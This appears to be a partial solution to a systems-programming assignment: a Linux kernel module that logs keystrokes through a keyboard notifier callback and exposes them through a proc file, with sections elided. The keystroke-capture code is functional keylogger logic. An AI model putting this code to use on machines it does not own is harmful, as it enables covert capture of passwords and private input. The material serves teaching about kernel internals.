...
/** 
 * TODO: Function called when someone reads our proc file 
 ...
 *  error code
 */
static ssize_t klogger_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
{
    int bytes_to_copy = min(len, buff_filled_size);

    if (bytes_to_copy <= 0) {
        return 0;
    }

    if (copy_to_user(buffer, keys_buffer, bytes_to_copy)) {
...
/**
 * TODO: Function called when a keypress event occurs
 * See assignment description
 *
 ...
 * Returns NOTIFY_OK
 */
int klogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE) {
        if (param->down) { // Key press event
            char key_string[CHUNK_LEN];
            keycode_to_string(param->value, param->shift, key_string);

            if (buff_filled_size + strlen(key_string) < BUF_LEN) {
                strcat(keys_buffer, key_string);
                buff_filled_size += strlen(key_string);
            }
        }
    }
